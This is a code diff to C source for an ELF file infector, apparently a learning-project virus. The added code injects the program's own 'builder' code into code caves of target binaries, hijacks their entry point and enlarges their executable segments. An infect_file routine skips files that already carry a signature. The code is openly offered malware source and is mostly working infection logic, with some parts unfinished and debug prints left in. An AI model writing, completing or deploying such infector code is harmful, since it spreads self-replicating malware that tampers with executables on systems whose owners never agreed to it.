@@ -123,6 +123,10 @@ ft_read(int fd, volatile void *ptr, size_t size) {
 }
 
 __attribute__((always_inline)) inline int
+ft_copy_file_range(int fd_in, uint64_t off_in, int fd_out, uint64_t off_out, size_t size, unsigned int flags) {
+    return sys(SYS_copy_file_range, fd_in, off_in, fd_out, off_out, size, flags);
+}
+__attribute__((always_inline)) inline int
 ft_lseek(int fd, off_t offset, int whence) {
     return sys(SYS_lseek, fd, (long)offset, whence, 0, 0, 0);
 }
@@ -360,7 +364,7 @@ e_entry_to_entry_offset(volatile file *file, volatile uint64_t e_entry) {
 
     Elf64_Phdr *program_header_table = file->mem + header->e_phoff;
 
-    for (int i = 0; i < header->e_shnum; i++) {
+    for (int i = 0; i < header->e_phnum; i++) {
         Elf64_Phdr *ph = program_header_table + i;
         if (e_entry >= ph->p_vaddr && e_entry < ph->p_vaddr + ph->p_memsz) return (e_entry + ph->p_offset) - ph->p_vaddr;
     }
@@ -388,6 +392,64 @@ get_full_needed_code_space(volatile scaffold_entry entries[], volatile uint64_t 
     return total;
 }
 
+__attribute__((always_inline)) inline uint64_t
+write_builder(volatile code_cave caves[], volatile uint64_t code_cave_num, volatile int fd_source, volatile int fd_destination, volatile uint64_t builder_start,
+              volatile uint64_t builder_size) {
+    for (int i = 0; i < code_cave_num; i++) {
+        if (caves[i].is_executable) {
+            ft_lseek(fd_source, builder_start, SEEK_SET);
+            ft_lseek(fd_destination, caves[i].start, SEEK_SET);
+
+            ft_copy_file_range(fd_source, 0, fd_destination, 0, builder_size, 0);
+            caves[i].start += builder_size;
+            caves[i].size -= builder_size;
+            return caves[i].start - builder_size;
+        }
+    }
+    return 0;
+}
+
+__attribute__((always_inline)) inline uint64_t
+convert_entry_offset_to_mem(volatile file *file, volatile uint64_t offset) {
+    Elf64_Ehdr *header = file->mem;
+
+    Elf64_Phdr *program_header_table = file->mem + header->e_phoff;
+
+    for (int i = 0; i < header->e_phnum; i++) {
+        Elf64_Phdr *ph = program_header_table + i;
+        // TODO: this is instable as FUCK!
+        if (offset == ph->p_offset + ph->p_filesz) {
+            return (offset + ph->p_vaddr) - ph->p_offset;
+        }
+    }
+
+    return 0;
+}
+
+__attribute__((always_inline)) inline uint64_t
+fill_in_code_caves(code_cave caves[], uint64_t cave_num, scaffold_entry entries[], uint64_t entry_num, int fd_in, int fd_out, uint64_t scaffold_table_offset) {
+    // write down how you would split it up
+    //
+    uint64_t table_size = 8 + 16 * cave_num;
+    uint64_t scaffold_table = caves[0].start;
+    caves[0].start += table_size;
+    caves[0].size -= table_size;
+
+    uint64_t cave_index = 0;
+    for (int e = 0; e < entry_num; e++) {
+        scaffold_entry *entry = &entries[e];
+        while (entry->end - entry->start != 0) {
+            if (caves[cave_index].size < 16) cave_index++;
+            if (entry->end - entry->start > caves[cave_index].size) {
+                // ft_lseek
+                // ft write
+                // check if thre is something left in the curren cave
+                // change size contininue
+            }
+        }
+    }
+}
+
 __attribute__((always_inline)) inline int
 infect_file(char *path) {
     int fd = ft_open(path, O_RDWR, 0);
@@ -399,7 +461,6 @@ infect_file(char *path) {
     const uint8_t has_signature = ft_string_search_fd(fd, signature);
 
     if (has_signature) return (0);
-
     ft_lseek(fd, 0, SEEK_SET);
 
     volatile Elf64_Ehdr header;
@@ -425,30 +486,36 @@ infect_file(char *path) {
     ft_read(fd_self, &header, sizeof(Elf64_Ehdr));
     file_mmap(fd_self, &file);
     uint64_t builder_start = e_entry_to_entry_offset(&file, header.e_entry);
-    uint64_t builder_size = 0xea;
+    uint64_t builder_size = 0xf2;
 
     ft_lseek(fd_self, builder_start + builder_size - 8, SEEK_SET);
 
     uint64_t scaffold_table_start;
     ft_read(fd_self, &scaffold_table_start, sizeof(scaffold_table_start));
-    print_number_nl(scaffold_table_start);
+    // print_number_nl(scaffold_table_start);
 
     uint64_t scaffold_table_num = *(uint64_t *)(file.mem + scaffold_table_start);
-    print_number_nl(scaffold_table_num);
-    scaffold_entry entries[scaffold_table_num];
+    // print_number_nl(scaffold_table_num);
+    volatile scaffold_entry entries[20];
     for (int i = 0; i < scaffold_table_num; i++) {
         entries[i].start = scaffold_table_start + *(uint64_t *)(file.mem + scaffold_table_start + 8 + i * 16);
         entries[i].end = scaffold_table_start + *(uint64_t *)(file.mem + scaffold_table_start + 16 + i * 16);
     }
 
-    for (int i = 0; i < scaffold_table_num; i++) {
-        print_number_nl(entries[i].start);
-        print_number_nl(entries[i].end);
-    }
+    print_number_nl(5555555);
+    // for (int i = 0; i < num; i++) {
+    //     print_number_nl(code_caves[i].start);
+    //     print_number_nl(code_caves[i].start + code_caves[i].size);
+    // }
+    // for (int i = 0; i < scaffold_table_num; i++) {
+    //     print_number_nl(entries[i].start);
+    //     print_number_nl(entries[i].end);
+    // }
+    print_number_nl(5555555);
 
     uint64_t signature_space = 25;
     uint64_t provided_space = get_code_cave_space(code_caves, num);
-    uint64_t needed_space = get_full_needed_code_space(entries, scaffold_table_num) + builder_size + 8 + num * 16 + signature_space;
+    uint64_t needed_space = get_full_needed_code_space(entries, scaffold_table_num) + builder_size + 8 + num * 16 + signature_space + signature_space;
     print_number_nl(provided_space);
     print_number_nl(needed_space);
 
@@ -459,9 +526,37 @@ infect_file(char *path) {
     print_number_nl(big_enough_builder_space);
     if (!big_enough_builder_space) return 0;
     if (provided_space < needed_space) return 0;
-    print_number_nl(42);
 
+    uint64_t builder_start_offset = write_builder(code_caves, num, fd_self, fd, builder_start, builder_size);
+    uint64_t destination_scaffold_table_offset = builder_start_offset + builder_size - 8;
+    uint64_t old_e_entry_offset = builder_start_offset + builder_size - 16;
+
+    file_mmap(fd, &file);
+    Elf64_Ehdr *h = file.mem;
+    ft_print_zero();
+
+    ft_lseek(fd, old_e_entry_offset, SEEK_SET);
+    ft_write(fd, &h->e_entry, sizeof(h->e_entry));
+    print_number_nl(old_e_entry_offset);
+
+    h->e_entry = convert_entry_offset_to_mem(&file, builder_start_offset);
+    ft_lseek(fd, 0, SEEK_SET);
+    ft_write(fd, h, sizeof(Elf64_Ehdr));
+
+    Elf64_Phdr *program_header_table = file.mem + h->e_phoff;
+    for (int i = 0; i < h->e_phnum; i++) {
+        Elf64_Phdr *ph = program_header_table + i;
+        if (ph->p_flags & SHF_EXECINSTR) {
+            ft_lseek(fd, h->e_phoff + i * h->e_phentsize, SEEK_SET);
+            ph->p_filesz += builder_size;
+            ph->p_memsz += builder_size;
+            ft_write(fd, ph, sizeof(Elf64_Phdr));
+        }
+    }
+
+    //
     // -----------------------------------------------------------
+
     return (0);
 }
 
